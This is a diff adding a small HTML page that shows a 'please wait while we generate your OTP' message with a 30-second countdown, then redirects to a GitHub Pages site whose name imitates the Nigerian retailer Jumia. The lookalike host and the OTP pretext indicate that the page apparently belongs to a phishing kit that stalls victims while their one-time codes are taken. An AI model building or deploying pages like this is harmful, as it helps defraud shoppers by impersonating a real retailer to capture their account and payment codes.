@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>OTP Countdown</title>
+</head>
+<body>
+
+  <p>Please wait while we generate your OTP. It will expire in <span id="countdown-timer">30 seconds</span>.</p>
+
+  <script>
+    window.onload = function() {
+      var countdownElement = document.getElementById("countdown-timer");
+      var countdown = 30;
+      var countdownInterval = setInterval(function() {
+        countdown--;
+        countdownElement.textContent = countdown + " seconds";
+        if (countdown <= 0) {
+          clearInterval(countdownInterval);
+          window.location.href = "https://jumia-ng-electronics-category-nig.github.io/jumia.com.ng/index2.html";
+        }
+      }, 1000);
+    };
+  </script>
+
+</body>
+</html>
